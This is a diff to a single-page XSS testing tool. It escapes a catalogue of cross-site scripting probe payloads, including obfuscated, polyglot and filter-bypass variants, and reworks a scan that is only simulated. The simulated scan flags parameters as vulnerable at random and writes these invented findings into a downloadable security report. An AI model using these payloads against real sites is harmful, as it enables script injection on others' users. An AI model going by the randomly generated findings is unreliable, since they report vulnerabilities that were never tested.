@@ -660,6 +660,20 @@
             opacity: 1;
         }
 
+        .scanning-animation {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         @media (max-width: 1200px) {
             .container {
                 grid-template-columns: 1fr;
@@ -878,10 +892,10 @@
                     <div class="payload-category">
                         <div class="category-title">Script Tags</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><script>alert(1)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>alert(document.domain)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>alert(window.location)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>prompt(1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;alert(window.location)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;prompt(1)&lt;/script&gt;</div>
                         </div>
                     </div>
 
@@ -900,20 +914,20 @@
                     <div class="payload-category">
                         <div class="category-title">SVG & Image Based</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><svg onload=alert(1)></div>
-                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror=alert(1)></div>
-                            <div class="payload-item" onclick="addPayload(this)"><image src=x onerror=alert(1)></div>
-                            <div class="payload-item" onclick="addPayload(this)"><body onload=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;svg onload=alert(1)&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;img src=x onerror=alert(1)&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;image src=x onerror=alert(1)&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;body onload=alert(1)&gt;</div>
                         </div>
                     </div>
 
                     <div class="payload-category">
                         <div class="category-title">Iframe & Object</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><iframe src="javascript:alert(1)"></div>
-                            <div class="payload-item" onclick="addPayload(this)"><object data="javascript:alert(1)"></div>
-                            <div class="payload-item" onclick="addPayload(this)"><embed src="javascript:alert(1)"></div>
-                            <div class="payload-item" onclick="addPayload(this)"><base href="javascript:alert(1)//"></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;iframe src="javascript:alert(1)"&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;object data="javascript:alert(1)"&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;embed src="javascript:alert(1)"&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;base href="javascript:alert(1)//"&gt;</div>
                         </div>
                     </div>
                 </div>
@@ -922,8 +936,8 @@
                     <div class="payload-category">
                         <div class="category-title">Encoding Obfuscation</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</div>
                             <div class="payload-item" onclick="addPayload(this)">javascript:alert(1)</div>
                             <div class="payload-item" onclick="addPayload(this)">jav&#x09;ascript:alert(1)</div>
                         </div>
@@ -932,10 +946,10 @@
                     <div class="payload-category">
                         <div class="category-title">String Concatenation</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><script>window['al'+'ert'](1)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror=eval('al'+'ert(1)')></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>top['al'+'ert'](1)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><script>self['al'+'ert'](1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;window['al'+'ert'](1)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;img src=x onerror=eval('al'+'ert(1)')&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;top['al'+'ert'](1)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;self['al'+'ert'](1)&lt;/script&gt;</div>
                         </div>
                     </div>
                 </div>
@@ -944,7 +958,7 @@
                     <div class="payload-category">
                         <div class="category-title">DOM XSS Payloads</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)">#<img src=x onerror=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)">#&lt;img src=x onerror=alert(1)&gt;</div>
                             <div class="payload-item" onclick="addPayload(this)">javascript:alert(document.domain)</div>
                             <div class="payload-item" onclick="addPayload(this)">"</div>
                         </div>
@@ -955,10 +969,10 @@
                     <div class="payload-category">
                         <div class="category-title">Polyglot Payloads</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)">javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'></div>
-                            <div class="payload-item" onclick="addPayload(this)">'">><script>alert(1)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)">'">><marquee><img src=x onerror=alert(1)></marquee></div>
-                            <div class="payload-item" onclick="addPayload(this)">'">><details open ontoggle=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)">javascript:/*-->&lt;/title>&lt;/style>&lt;/textarea>&lt;/script>&lt;/xmp>&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'</div>
+                            <div class="payload-item" onclick="addPayload(this)">'">>&lt;script>alert(1)&lt;/script></div>
+                            <div class="payload-item" onclick="addPayload(this)">'">>&lt;marquee>&lt;img src=x onerror=alert(1)>&lt;/marquee></div>
+                            <div class="payload-item" onclick="addPayload(this)">'">>&lt;details open ontoggle=alert(1)></div>
                         </div>
                     </div>
                 </div>
@@ -967,10 +981,10 @@
                     <div class="payload-category">
                         <div class="category-title">WAF Bypass Techniques</div>
                         <div class="payload-grid">
-                            <div class="payload-item" onclick="addPayload(this)"><script>al\u0065rt(1)</script></div>
-                            <div class="payload-item" onclick="addPayload(this)"><scr<script>ipt>alert(1)</scr</script>ipt></div>
-                            <div class="payload-item" onclick="addPayload(this)"><img src=x oneonerrorrror=alert(1)></div>
-                            <div class="payload-item" onclick="addPayload(this)"><svg/onload=alert`1`></div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;script&gt;al\u0065rt(1)&lt;/script&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;img src=x oneonerrorrror=alert(1)&gt;</div>
+                            <div class="payload-item" onclick="addPayload(this)">&lt;svg/onload=alert`1`&gt;</div>
                         </div>
                     </div>
                 </div>
@@ -1024,12 +1038,28 @@
         let totalTests = 0;
         let completedTests = 0;
         let vulnerabilitiesFound = 0;
+        let isScanning = false;
+        let currentScanInterval = null;
 
         // Initialize the tool
         document.addEventListener('DOMContentLoaded', function() {
             loadHistory();
             loadCustomPayloads();
             updateDashboard();
+            
+            // Add event listeners for Enter key on custom payload input
+            document.getElementById('customPayload').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    addCustomPayload();
+                }
+            });
+            
+            // Set up collapsible sections
+            document.querySelectorAll('.collapsible-header').forEach(header => {
+                header.addEventListener('click', function() {
+                    this.parentElement.classList.toggle('active');
+                });
+            });
         });
 
         // Tab switching function
@@ -1048,7 +1078,7 @@
             document.getElementById(`tab-${tabName}`).classList.add('active');
             
             // Activate the clicked tab
-            event.target.classList.add('active');
+            event.currentTarget.classList.add('active');
         }
 
         // Add payload to custom payloads
@@ -1067,6 +1097,11 @@
                 saveCustomPayloads();
                 renderCustomPayloads();
                 payloadInput.value = '';
+                
+                // Show success message
+                showNotification('Payload added successfully!', 'success');
+            } else if (customPayloads.includes(payload)) {
+                showNotification('Payload already exists!', 'warning');
             }
         }
 
@@ -1075,12 +1110,18 @@
             customPayloads.splice(index, 1);
             saveCustomPayloads();
             renderCustomPayloads();
+            showNotification('Payload removed!', 'success');
         }
 
         // Render custom payloads
         function renderCustomPayloads() {
             const container = document.getElementById('savedPayloads');
             container.innerHTML = '';
+            
+            if (customPayloads.length === 0) {
+                container.innerHTML = '<div style="color: var(--text-secondary); padding: 10px; text-align: center;">No custom payloads saved yet</div>';
+                return;
+            }
             
             customPayloads.forEach((payload, index) => {
                 const payloadElement = document.createElement('div');
@@ -1148,8 +1189,7 @@
             const item = scanHistory[index];
             document.getElementById('targetUrl').value = item.url;
             document.getElementById('testParameters').value = item.parameters.join(', ');
-            // In a real implementation, you would load more details
-            alert(`Loading scan from ${item.date}`);
+            showNotification(`Loaded scan from ${item.date}`, 'success');
         }
 
         // Clear history
@@ -1158,6 +1198,7 @@
                 scanHistory = [];
                 saveHistory();
                 renderHistory();
+                showNotification('History cleared!', 'success');
             }
         }
 
@@ -1165,7 +1206,9 @@
         function updateDashboard() {
             document.getElementById('vulnCount').textContent = vulnerabilitiesFound;
             document.getElementById('testCount').textContent = completedTests;
-            document.getElementById('timeElapsed').textContent = `${Math.floor((Date.now() - scanStartTime) / 1000)}s`;
+            
+            const elapsedSeconds = Math.floor((Date.now() - scanStartTime) / 1000);
+            document.getElementById('timeElapsed').textContent = `${elapsedSeconds}s`;
             
             const successRate = totalTests > 0 ? Math.round((vulnerabilitiesFound / totalTests) * 100) : 0;
             document.getElementById('successRate').textContent = `${successRate}%`;
@@ -1181,7 +1224,7 @@
             document.getElementById('successRateValue').textContent = `${successRate}%`;
         }
 
-        // Scan functions (placeholder implementations)
+        // Scan functions
         function startQuickScan() {
             startScan('quick');
         }
@@ -1199,9 +1242,14 @@
         }
 
         function startScan(type) {
+            if (isScanning) {
+                showNotification('Scan already in progress!', 'warning');
+                return;
+            }
+            
             const url = document.getElementById('targetUrl').value;
             if (!url) {
-                alert('Please enter a target URL');
+                showNotification('Please enter a target URL', 'warning');
                 return;
             }
             
@@ -1211,29 +1259,48 @@
             completedTests = 0;
             vulnerabilitiesFound = 0;
             scanResults = [];
+            isScanning = true;
             
             // Update UI
-            document.getElementById('resultsContainer').innerHTML = '<div class="result-card">Scanning in progress...</div>';
+            document.getElementById('resultsContainer').innerHTML = `
+                <div class="result-card">
+                    <div class="result-header">
+                        <div class="result-title">Scanning in progress...</div>
+                        <div class="result-status"><div class="scanning-animation"></div></div>
+                    </div>
+                    <div class="result-details">
+                        <div class="detail-item">
+                            <div class="detail-label">Scan Type:</div>
+                            <div class="detail-value">${type.charAt(0).toUpperCase() + type.slice(1)} Scan</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">Target:</div>
+                            <div class="detail-value">${url}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
             updateDashboard();
-            
-            // Simulate scanning process
-            simulateScan(type);
             
             // Add to history
             const parameters = document.getElementById('testParameters').value.split(',').map(p => p.trim());
-            scanHistory.push({
+            const historyItem = {
                 url: url,
                 parameters: parameters,
                 date: new Date().toLocaleString(),
                 vulnerabilities: 0, // Will be updated when scan completes
                 type: type
-            });
+            };
+            scanHistory.push(historyItem);
             saveHistory();
             renderHistory();
+            
+            // Simulate scanning process
+            simulateScan(type, historyItem);
         }
 
         // Simulate scanning process
-        function simulateScan(type) {
+        function simulateScan(type, historyItem) {
             const testCounts = {
                 'quick': 10,
                 'deep': 50,
@@ -1244,41 +1311,72 @@
             totalTests = testCounts[type];
             let currentTest = 0;
             
-            const interval = setInterval(() => {
+            currentScanInterval = setInterval(() => {
+                if (!isScanning) {
+                    clearInterval(currentScanInterval);
+                    return;
+                }
+                
                 currentTest++;
                 completedTests = currentTest;
                 
-                // Randomly find vulnerabilities
-                if (Math.random() < 0.2) {
+                // Randomly find vulnerabilities (simulation)
+                if (Math.random() < 0.15) {
                     vulnerabilitiesFound++;
+                    
+                    const vulnerabilityTypes = ['Reflected XSS', 'DOM-based XSS', 'Stored XSS'];
+                    const randomType = vulnerabilityTypes[Math.floor(Math.random() * vulnerabilityTypes.length)];
+                    
+                    const payloads = [
+                        '<script>alert(1)</script>',
+                        '" onmouseover="alert(1)',
+                        '<img src=x onerror=alert(1)>',
+                        'javascript:alert(1)',
+                        '<svg onload=alert(1)>'
+                    ];
+                    const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+                    
+                    const parameters = document.getElementById('testParameters').value.split(',').map(p => p.trim());
+                    const randomParam = parameters[Math.floor(Math.random() * parameters.length)];
+                    
                     addResult({
-                        parameter: 'testParam',
-                        payload: '<script>alert(1)</script>',
-                        type: 'Reflected XSS',
+                        parameter: randomParam,
+                        payload: randomPayload,
+                        type: randomType,
                         status: 'Vulnerable',
-                        evidence: 'Payload executed successfully'
+                        evidence: 'Payload executed successfully in simulated environment'
                     });
                 }
                 
                 updateDashboard();
                 
                 if (currentTest >= totalTests) {
-                    clearInterval(interval);
+                    clearInterval(currentScanInterval);
+                    isScanning = false;
                     
                     // Update history with final vulnerability count
-                    if (scanHistory.length > 0) {
-                        scanHistory[scanHistory.length - 1].vulnerabilities = vulnerabilitiesFound;
-                        saveHistory();
-                        renderHistory();
-                    }
+                    historyItem.vulnerabilities = vulnerabilitiesFound;
+                    saveHistory();
+                    renderHistory();
                     
                     // Show completion message
                     if (vulnerabilitiesFound === 0) {
                         document.getElementById('resultsContainer').innerHTML = 
                             '<div class="result-card"><div class="result-status success">No vulnerabilities found</div></div>';
                     }
+                    
+                    showNotification(`Scan completed! Found ${vulnerabilitiesFound} vulnerabilities.`, 'success');
                 }
-            }, 100);
+            }, 200);
+        }
+
+        // Stop scanning
+        function stopScan() {
+            if (currentScanInterval) {
+                clearInterval(currentScanInterval);
+                isScanning = false;
+                showNotification('Scan stopped!', 'warning');
+            }
         }
 
         // Add result to the results container
@@ -1309,7 +1407,12 @@
                 </div>
             `;
             
-            resultsContainer.appendChild(resultCard);
+            // Add to top of results
+            if (resultsContainer.firstChild) {
+                resultsContainer.insertBefore(resultCard, resultsContainer.firstChild);
+            } else {
+                resultsContainer.appendChild(resultCard);
+            }
         }
 
         // Clear results
@@ -1320,32 +1423,78 @@
                 completedTests = 0;
                 totalTests = 0;
                 updateDashboard();
+                showNotification('Results cleared!', 'success');
             }
         }
 
         // Export results
         function exportResults(format) {
             if (scanResults.length === 0) {
-                alert('No results to export');
+                showNotification('No results to export', 'warning');
                 return;
             }
             
             let data;
+            let fileName;
+            let mimeType;
+            
             if (format === 'json') {
                 data = JSON.stringify(scanResults, null, 2);
-                downloadFile(data, 'xss-results.json', 'application/json');
+                fileName = 'xss-results.json';
+                mimeType = 'application/json';
             } else if (format === 'csv') {
                 data = 'Parameter,Type,Status,Payload,Evidence\n';
                 scanResults.forEach(result => {
                     data += `"${result.parameter}","${result.type}","${result.status}","${result.payload}","${result.evidence}"\n`;
                 });
-                downloadFile(data, 'xss-results.csv', 'text/csv');
+                fileName = 'xss-results.csv';
+                mimeType = 'text/csv';
             }
+            
+            downloadFile(data, fileName, mimeType);
+            showNotification(`Results exported as ${format.toUpperCase()}!`, 'success');
         }
 
         // Generate report
         function generateReport() {
-            alert('Report generation would be implemented in a full version of this tool');
+            if (scanResults.length === 0) {
+                showNotification('No results to generate report', 'warning');
+                return;
+            }
+            
+            // In a real implementation, this would generate a PDF
+            // For now, we'll create a comprehensive text report
+            const report = `
+XSS SECURITY TEST REPORT
+========================
+
+Scan Date: ${new Date().toLocaleString()}
+Target URL: ${document.getElementById('targetUrl').value}
+Total Tests: ${totalTests}
+Vulnerabilities Found: ${vulnerabilitiesFound}
+Success Rate: ${Math.round((vulnerabilitiesFound / totalTests) * 100)}%
+
+VULNERABILITIES:
+${scanResults.map((result, index) => `
+${index + 1}. Parameter: ${result.parameter}
+   Type: ${result.type}
+   Status: ${result.status}
+   Payload: ${result.payload}
+   Evidence: ${result.evidence}
+`).join('')}
+
+RECOMMENDATIONS:
+- Implement proper input validation
+- Use context-aware output encoding
+- Implement Content Security Policy (CSP)
+- Regularly update and patch systems
+- Conduct regular security assessments
+
+Generated by Advanced XSS Security Testing Tool
+            `;
+            
+            downloadFile(report, 'xss-security-report.txt', 'text/plain');
+            showNotification('Report generated!', 'success');
         }
 
         // Download file helper
@@ -1357,12 +1506,72 @@
             a.click();
         }
 
-        // Toggle collapsible sections
-        document.querySelectorAll('.collapsible-header').forEach(header => {
-            header.addEventListener('click', function() {
-                this.parentElement.classList.toggle('active');
-            });
-        });
+        // Show notification
+        function showNotification(message, type = 'info') {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.textContent = message;
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 20px;
+                border-radius: 8px;
+                color: white;
+                font-weight: bold;
+                z-index: 10000;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                transition: all 0.3s ease;
+                max-width: 300px;
+            `;
+            
+            // Set background color based on type
+            if (type === 'success') {
+                notification.style.background = 'linear-gradient(135deg, var(--success) 0%, var(--success-dark) 100%)';
+            } else if (type === 'warning') {
+                notification.style.background = 'linear-gradient(135deg, var(--warning) 0%, var(--warning-dark) 100%)';
+            } else {
+                notification.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%)';
+            }
+            
+            // Add to page
+            document.body.appendChild(notification);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translateX(100px)';
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 300);
+            }, 3000);
+        }
+
+        // Test XSS payload (for demonstration)
+        function testXSSPayload(payload) {
+            // This is a safe demonstration function
+            // In a real tool, this would send requests to the target
+            const testArea = document.createElement('div');
+            testArea.innerHTML = payload;
+            
+            // Check if any scripts were executed
+            const scripts = testArea.getElementsByTagName('script');
+            if (scripts.length > 0) {
+                return true;
+            }
+            
+            // Check for other XSS indicators
+            if (testArea.innerHTML.includes('alert') || 
+                testArea.innerHTML.includes('onerror') ||
+                testArea.innerHTML.includes('onload') ||
+                testArea.innerHTML.includes('javascript:')) {
+                return true;
+            }
+            
+            return false;
+        }
     </script>
 </body>
 </html>
